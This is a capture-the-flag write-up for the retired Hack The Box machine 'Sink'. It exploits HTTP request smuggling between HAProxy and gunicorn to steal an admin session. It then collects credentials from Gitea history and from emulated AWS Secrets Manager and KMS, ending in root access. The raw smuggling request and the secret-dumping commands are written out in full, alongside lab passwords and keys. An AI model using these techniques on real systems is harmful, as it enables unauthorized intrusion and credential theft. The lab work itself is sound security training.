# Sink

This is the write-up for the box Sink that got retired at the 18th September 2021.
My IP address was 10.10.14.5 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.225    sink.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/sink.nmap 10.10.10.225
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
3000/tcp open  ppp?
| fingerprint-strings:
|   GenericLines, Help:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
(...)
5000/tcp open  http    Gunicorn 20.0.0
|_http-title: Sink Devops
|_http-server-header: gunicorn/20.0.0
(...)
```

## Checking HTTP (Port 5000)

The web service on port 5000 has the title _"Sink Devops"_ and looks like a custom developed website, where it is possible to _Sign Up_:

![Sink Devops Login](sink_web-1.png)

After signing up, there is one article about _DevOps_ and a potential existing username _admin@sink.htb_:

![Sink Devops Login](sink_web-2.png)

The _Notes_ menu and the comments section on _Home_ allows us to send data to the service, which may contain a vulnerability.

The _Server header_ is **gunicorn/20.0.0**, which was [released in October 2019](https://docs.gunicorn.org/en/stable/2019-news.html).
This version had some patches and of them prevents **HTTP Request Smuggling**:
```
(...)
fixed chunked encoding support to prevent any request smuggling
```

There is a link to an [explanation from PortSwigger](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn) about this attack.

Another header is _"Via: haproxy"_ which indicates that [High Availability Proxy](https://www.haproxy.org/) is used for load balancing, to spread requests across multiple servers.

This web application seems to be vulnerable to **HTTP Request Smuggling** and [this article](https://nathandavison.com/blog/haproxy-http-request-smuggling) explains this attack with **HAProxy**.

### Exploiting HTTP Request Smuggling

The load balancer **HAProxy** sends every request to the web server **gunicorn**.
The TCP-handshake in these requests are a bigger than usual, as these rely on **chunking**, which allows to send multiple HTTP requests in a single packet.

In this vulnerability a _vertical tab_ in the _Transfer-Encoding_ header is used, that is ignored by **HAProxy**, but gets processed by **gunicorn** to hijack the request.

The _vertical tab_ is in the ASCII table and has the hex value of _0B_.

Base64-encoding the vertical tab:
```
printf \\x0b | base64

Cw==
```

Sending the headers to the service:
```
GET /home HTTP/1.1
Host: 10.10.10.225:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Cookie: session=eyJlbWFpbCI6InRlc3RAdGVzdC5sb2NhbCJ9.Yne0Sw.83Ohi10t3BlFAYZZGP541ni9LFo
Content-Length: 169
Transfer-Encoding:chunked

0

POST /notes HTTP/1.1
Host: 10.10.10.225:5000
Cookie: session=eyJlbWFpbCI6InRlc3RAdGVzdC5sb2NhbCJ9.Yne2dg.x7eqSTgusGC5cb4oTNa5m7lRdqI
Content-Length: 280

note=
```

The value in the _Transfer-Encoding_ header is _"Cw==chunked"_, but Base64-decoded with **Burpsuite**.
After sending the request several times, it creates two notes with HTTP requests and one of them has different cookies than ours:

![Smuggled Notes](sink_web-3.png)

```
GET /notes/delete/1234 HTTP/1.1 Host: 127.0.0.1:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept-Encoding: gzip, deflate Accept: */* Cookie: session=eyJlbWFpbCI6ImFkbWluQHNpbmsuaHRiIn0.Ynezqg.8sVu29fOo9GLgGhrZVL-KqSrszs X-Forwa
```

By taking it and replacing our session cookies in the **Browser Developer Tools**, we get logged in as the user _admin@sink.htb_.

This user has three interesting notes:
```
Chef Login : http://chef.sink.htb Username : chefadm Password : /6'fEGC&zEx{4]zz

Dev Node URL : http://code.sink.htb Username : root Password : FaH@3L>Z3})zzfQ3

Nagios URL : https://nagios.sink.htb Username : nagios_adm Password : g8<H6GK\{*L.fB3C
```

To access the found hostnames, they have to be added to the _/etc/hosts_ file.
All of these hostnames are listening on the same ports and don't host other services.

## Checking HTTP (Port 3000)

The web service on port 3000 hosts the version control system [Gitea](https://gitea.io/) version _1.12.6_.
The credentials of the _"Dev Node URL"_ can be successfully used to sign into the **Gitea** platform.

This user has four repositories:
- Kinesis_Elasticsearch
  - Elasticsearch runs on port 9200 by default, so it may be running locally
- Serverless-Plugin
  - _package.json_ shows that this runs **LocalStack** which runs on port 4566 by default
  - **LocalStack** is used to emulate **AWS** deployments
- Key_Management
  - This repository is marked as _archived_ and may contain interesting secrets
- Log_Management
  - _create_logs.php_ shows that this runs **CloudWatch** which is a monitoring service for **AWS** instances

The history of _create_logs.php_ in the repository _Log_Management_ leaks some secrets:
```
$client = new CloudWatchLogsClient([
	'region' => 'eu',
	'endpoint' => 'http://127.0.0.1:4566',
	'credentials' => [
		'key' => 'AKIAIUEN3QWCPSTEITJQ',
		'secret' => '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'
(...)
```

The history of _ec2.php_ in the repository _Key_Management_ contains an SSH key.
The username of the developer that pushed the changes is called _marcus_, so lets try to login as this user with the SSH key:
```
ssh -i ssh.key marcus@10.10.10.225
```

## Privilege Escalation

The `ss` command shows that port 4566 is listening on localhost and the **AWS** command line tools are installed, which indicates to enumerate it.
As there is a repository for **CloudWatch**, the logs should be analyzed:
```
awslocal logs describe-log-groups
```
```
{
    "logGroups": [
        {
            "logGroupName": "cloudtrail",
(...)
```

Getting stream name of log group _cloudtrail_:
```
awslocal logs describe-log-streams --log-group-name cloudtrail
```
```
{
    "logStreams": [
        {
            "logStreamName": "20201222",
(...)
```

Getting events from the log stream:
```
awslocal logs get-log-events --log-group-name cloudtrail --log-stream-name 20201222
```
```
{
    "events": [
        {
            "timestamp": 1126190184356,
            "message": "RotateSecret",
            "ingestionTime": 1652035921209
        },
(...)
        {
            "timestamp": 1433190184360,
            "message": "RotateSecret",
            "ingestionTime": 1652035921209
        },
        {
            "timestamp": 1533190184356,
            "message": "RestoreSecret",
            "ingestionTime": 1652035921209
        }
    ]
```

These are [Actions from the AWS Secrets Manager](https://docs.aws.amazon.com/secretsmanager/latest/apireference/API_Operations.html) and there are three secrets stored in this instance:
```
awslocal secretsmanager list-secrets
```
```
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-sNBMC",
            "Name": "Jenkins Login",
            "Description": "Master Server to manage release cycle 1",
(...)
            {
            "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-icPwv",
            "Name": "Sink Panel",
            "Description": "A panel to manage the resources in the devnode",
(...)
            {
            "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-sFGWa",
            "Name": "Jira Support",
            "Description": "Manage customer issues",
(...)
```

Getting secrets from all groups:
```
awslocal secretsmanager get-secret-value --secret-id "Jenkins Login"

awslocal secretsmanager get-secret-value --secret-id "Sink Panel"

awslocal secretsmanager get-secret-value --secret-id "Jira Support"
```
```
"SecretString": "{\"username\":\"john@sink.htb\",\"password\":\"R);\\)ShS99mZ~8j\"}",

"SecretString": "{\"username\":\"albert@sink.htb\",\"password\":\"Welcome123!\"}",

"SecretString": "{\"username\":\"david@sink.htb\",\"password\":\"EALB=bcC=`a7f2#k\"}",
```

The _/etc/passwd_ file shows that only the user _david_ exists and has a home folder.
The password works and users can be changed with `su` to _david_.

### Privilege Escalation to root

In the home folder _/home/david/Projects/Prod_Deployment_ is a file called _servers.enc_ and it looks like some kind of encrypted file.
In **AWS** files can be encrypted with [AWS Key Management Service](https://docs.aws.amazon.com/kms/latest/developerguide/overview.html):
```
awslocal kms list-keys
```

There are 11 keys and a for loop can be used to get the contents of all of them:
```bash
for i in $(awslocal kms list-keys | grep KeyId | awk -F\" '{print $4}'); do awslocal kms describe-key --key-id $i; done
```

Getting a list of disabled and enabled keys:
```bash
for i in $(awslocal kms list-keys | grep KeyId | awk -F\" '{print $4}'); do echo -n "$i : "; awslocal kms describe-key --key-id $i | grep KeyState; done
```

There are two enabled keys:
```
awslocal kms describe-key --key-id 804125db-bdf1-465a-a058-07fc87c0fad0
```
```
"KeyId": "804125db-bdf1-465a-a058-07fc87c0fad0",
        "Enabled": true,
        "Description": "Encryption and Decryption",
        (...)
        "CustomerMasterKeySpec": "RSA_4096",
        "EncryptionAlgorithms": [
            "RSAES_OAEP_SHA_1",
            "RSAES_OAEP_SHA_256"
```
```
awslocal kms describe-key --key-id c5217c17-5675-42f7-a6ec-b5aa9b9dbbde
```
```
"KeyId": "c5217c17-5675-42f7-a6ec-b5aa9b9dbbde",
        "Enabled": true,
        "Description": "Digital Signature Verification",
(...)
```

The key with the description _"Encryption and Decryption"_ is probably needed to decrypt the file:
```
awslocal kms decrypt --key-id 804125db-bdf1-465a-a058-07fc87c0fad0 --ciphertext-blob fileb://servers.enc --encryption-algorithm RSAES_OAEP_SHA_256 --output text
```

It outputs a Base64-encoded string, that has to be decoded:
```
cat servers.enc.b64 | base64 -d > servers.enc
```
```
file servers.enc

servers.enc: gzip compressed data, from Unix, original size modulo 2^32 10240
```

It is a **gzip archive** that has to be decompressed:
```
mv servers.enc servers.gz

gzip -d servers.gz
```
```
file servers

servers: POSIX tar archive (GNU)
```

It is a **tar archive** that has to be decompressed:
```
mv servers servers.tar

tar -xvf servers.tar
```

It contains two files _servers.sig_ and _servers.yml_ which has some hostnames and credentials:
```
server:
  listenaddr: ""
  port: 80
  hosts:
    - certs.sink.htb
    - vault.sink.htb
defaultuser:
  name: admin
  pass: _uezduQ!EY5AHfe2
```

After trying the password to switch users with `su -`, it starts a shell as root!
